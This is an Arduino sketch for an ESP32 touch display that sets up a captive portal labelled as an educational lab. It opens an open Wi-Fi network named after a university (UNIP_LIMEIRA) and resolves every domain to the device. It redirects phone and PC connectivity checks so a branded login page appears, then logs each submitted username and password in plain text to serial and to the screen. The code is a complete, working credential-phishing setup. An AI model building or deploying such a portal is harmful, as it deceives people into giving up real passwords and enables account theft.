/*******************************************************************
    A touch screen test for the ESP32 Cheap Yellow Display.

    https://github.com/witnessmenow/ESP32-Cheap-Yellow-Display

    If you find what I do useful and would like to support me,
    please consider becoming a sponsor on Github
    https://github.com/sponsors/witnessmenow/

    Written by Brian Lough
    YouTube: https://www.youtube.com/brianlough
    Twitter: https://twitter.com/witnessmenow
 *******************************************************************/

// Make sure to copy the UserSetup.h file into the library as
// per the Github Instructions. The pins are defined in there.

// ----------------------------
// Standard Libraries
// ----------------------------

#include <SPI.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
// WiFi / DNSServer / WebServer are all part of the ESP32 Arduino core,
// no extra install needed. WiFi scans for nearby access points; the
// DNS + web server pair implement an educational captive portal.

// ----------------------------
// Additional Libraries - each one of these will need to be installed.
// ----------------------------

#include <XPT2046_Touchscreen.h>
// A library for interfacing with the touch screen
//
// Can be installed from the library manager (Search for "XPT2046")
//https://github.com/PaulStoffregen/XPT2046_Touchscreen

#include <TFT_eSPI.h>
// A library for interfacing with LCD displays
//
// Can be installed from the library manager (Search for "TFT_eSPI")
//https://github.com/Bodmer/TFT_eSPI

#include "logo_unip.h"
// The UNIP logo as a raw PNG byte array (for the captive portal's web page,
// served as-is from flash at /logo.png -- see handleLogo()). Defines
// Screenshot_from_2026_10_21_17_15_40_png[] and its _len.


// ----------------------------
// Touch Screen pins
// ----------------------------

// The CYD touch uses some non default
// SPI pins

#define XPT2046_IRQ 36
#define XPT2046_MOSI 32
#define XPT2046_MISO 39
#define XPT2046_CLK 25
#define XPT2046_CS 33

// ----------------------------

SPIClass mySpi = SPIClass(VSPI);
XPT2046_Touchscreen ts(XPT2046_CS, XPT2046_IRQ);

TFT_eSPI tft = TFT_eSPI();

// ----------------------------
// Captive portal (educational lab)
// ----------------------------
const char *PORTAL_SSID = "UNIP_LIMEIRA";   // open access point name
const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer  server(80);

// Visual theme (colors, HUD layout) and every screen-drawing / HTML-page
// function now live in visual.ino.
extern bool portalShowingCapture;  // defined in visual.ino; read by loop()'s blink timer

// The screen the device is currently showing. It starts on the intro logo
// (with its oscillating blade reflection) and moves on when touched.
enum AppMode { MODE_INTRO, MODE_SCAN, MODE_PORTAL };
AppMode currentMode = MODE_INTRO;

// Last submission captured by the portal (fictitious lab data).
int    captureCount = 0;
String lastUser = "";
String lastPass = "";

void setup() {
  Serial.begin(115200);

  // Start the SPI for the touch screen and init the TS library
  mySpi.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
  ts.begin(mySpi);
  ts.setRotation(1);

  // Start the tft display and set it to black
  tft.init();
  tft.setRotation(1); //This is the display in landscape

  // Put the radio in station mode and make sure it isn't connected to
  // anything, so a scan sees every nearby access point.
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Slash the logo into view, then stay on the intro (MODE_INTRO) with a
  // blade reflection sweeping over it until the screen is touched.
  showIntro();
  currentMode = MODE_INTRO;
}

// ----------------------------
// Captive portal implementation
// ----------------------------
// showIntro(), loginPageHtml(), resultPageHtml() and every screen-drawing
// function (drawHudFrame, showPortalStatus, showPortalCapture, etc.) live
// in visual.ino -- this file only wires up the network/HTTP logic.

// Serve the login page for the root and for any unknown URL, so the phone's
// captive-portal detector pops the page open.
void handleRoot() {
  server.send(200, "text/html", loginPageHtml());
}

// Streams the UNIP logo straight from flash. Using the explicit-length
// overload (not send_P's strlen-based one) matters here: the PNG bytes
// contain embedded zeros that would otherwise truncate the response.
void handleLogo() {
  server.send_P(200, "image/png",
                (PGM_P)Screenshot_from_2026_10_21_17_15_40_png,
                Screenshot_from_2026_10_21_17_15_40_png_len);
}

// Android (and Windows) connectivity-check endpoints expect a 204 when there
// IS internet access. Answering them with a 302 to our own IP -- instead of
// the 200+HTML that onNotFound sends everyone else -- is what makes Android
// show the "Fazer login na rede Wi-Fi" notification quickly and reliably.
// iOS doesn't need this: its own detector already pops the login page from
// any non-"Success" response.
void handleCaptiveRedirect() {
  server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
  server.send(302, "text/plain", "");
}

// Capture the submitted (fictitious) credentials and confirm.
void handleLogin() {
  lastUser = server.arg("user");
  lastPass = server.arg("pass");
  captureCount++;

  Serial.printf("[PORTAL] #%d user='%s' pass='%s'\n",
                captureCount, lastUser.c_str(), lastPass.c_str());

  showPortalCapture();
  server.send(200, "text/html", resultPageHtml(lastUser));
}

// Switch into captive-portal mode: open AP, DNS catch-all, web server.
void startPortalMode() {
  currentMode = MODE_PORTAL;

  WiFi.mode(WIFI_AP);
  WiFi.softAP(PORTAL_SSID);
  IPAddress ip = WiFi.softAPIP();

  dnsServer.start(DNS_PORT, "*", ip);       // resolve every domain to us

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/logo.png", HTTP_GET, handleLogo);

  // Android connectivity checks (varies by OEM/version).
  server.on("/generate_204", handleCaptiveRedirect);
  server.on("/gen_204", handleCaptiveRedirect);
  // Windows connectivity checks.
  server.on("/ncsi.txt", handleCaptiveRedirect);
  server.on("/connecttest.txt", handleCaptiveRedirect);
  server.on("/fwlink", handleCaptiveRedirect);

  server.onNotFound(handleRoot);            // triggers captive-portal popup (iOS etc.)
  server.begin();

  Serial.printf("[PORTAL] AP '%s' up at %s\n", PORTAL_SSID, ip.toString().c_str());
  showPortalStatus(ip);
}

void printTouchToSerial(TS_Point p) {
  Serial.print("Pressure = ");
  Serial.print(p.z);
  Serial.print(", x = ");
  Serial.print(p.x);
  Serial.print(", y = ");
  Serial.print(p.y);
  Serial.println();
}

void printTouchToDisplay(TS_Point p) {

  // Clear screen first
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  int x = 320 / 2; // center of display
  int y = 100;
  int fontSize = 2;

  String temp = "Pressure = " + String(p.z);
  tft.drawCentreString(temp, x, y, fontSize);

  y += 16;
  temp = "X = " + String(p.x);
  tft.drawCentreString(temp, x, y, fontSize);

  y += 16;
  temp = "Y = " + String(p.y);
  tft.drawCentreString(temp, x, y, fontSize);
}

void loop() {
  // The intro is static ("TOQUE PARA INICIAR_") and just waits for a touch.
  if (currentMode == MODE_PORTAL) {
    dnsServer.processNextRequest();
    server.handleClient();

    // Non-blocking blink: live dot always, terminal cursor only on the
    // status screen (the capture screen doesn't have one to redraw).
    static unsigned long lastBlinkMs = 0;
    static bool blinkOn = true;
    if (millis() - lastBlinkMs > 500) {
      lastBlinkMs = millis();
      blinkOn = !blinkOn;
      setLiveDot(blinkOn);
      if (!portalShowingCapture) setCursorBlock(blinkOn);
    }
  }

  // Edge-triggered touch: only act on the transition from not-touched to
  // touched, so a held finger or WiFi noise on the shared SPI bus can't
  // toggle the mode over and over (which showed up as the screen flashing).
  static bool wasTouched = false;
  bool nowTouched = ts.tirqTouched() && ts.touched();

  if (nowTouched && !wasTouched) {
    TS_Point p = ts.getPoint();
    printTouchToSerial(p);
    if (currentMode == MODE_INTRO) {
      startPortalMode();   // leave the intro
    } else if (currentMode == MODE_PORTAL && portalShowingCapture) {
      // "Voltar" button on the capture screen: go back to the waiting
      // screen, which redraws with the now-current capture counter.
      showPortalStatus(WiFi.softAPIP());
    }
  }
  wasTouched = nowTouched;
}